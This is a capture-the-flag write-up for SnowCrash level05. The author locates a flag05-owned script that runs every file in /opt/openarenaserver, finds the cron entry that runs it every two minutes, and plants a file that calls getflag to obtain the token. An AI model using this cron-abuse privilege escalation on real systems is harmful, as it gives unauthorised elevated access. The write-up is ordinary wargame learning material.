# 1st Step
  
Nothing in level05 home folder so as in level00 let's FIND this first file who can run only as flag05  
```
level05@SnowCrash:~$ find / -user flag05 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
level05@SnowCrash:~$ ls -l /usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
level05@SnowCrash:~$
```  
***Notes** : Again, the owner of the file is `flag05`*  
Let's take a look at the code inside  
```
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
level05@SnowCrash:~$
```
Seems that this script will execute every files in `/opt/openarenaserver` then delete them.  
Cause this script is execute by `flag05` we should try to execute `getflag` !  
Only one question stay : When and how this script is execute ?  

# 2nd Step
First, I search all files who can run as root .. As you guess there is a lots ! But probably by chance et before specify my research (only certains filename, ...etc) I saw this line at the end of my result comand:  
```
level05@SnowCrash:~$ find / -user root 2>/dev/null
.
.
.
/rofs/var/mail/level05
.
.
```  
If we take a look inside the file:  
```
level05@SnowCrash:~$ cat /rofs/var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
level05@SnowCrash:~$
```  
We can see that every 2min, `/usr/sbin/openarenaserver` is execute !  

# 3rd Step
Now we can try to execute `getflag` with `/usr/sbin/openarenaserver`:  
```
level05@SnowCrash:~$ echo "/bin/getflag > /tmp/my_file" > /opt/openarenaserver/my_file
level05@SnowCrash:~$ cat /opt/openarenaserver/my_file
/bin/getflag > /tmp/my_file
level05@SnowCrash:~$
```  
Wait few minutes (2 max)  
```
level05@SnowCrash:~$ cat /tmp/my_file
Check flag.Here is your token : viuaaale9huek52boumoomioc
level05@SnowCrash:~$ su level06
Password:
level06@SnowCrash:~$
```  
level05 passed !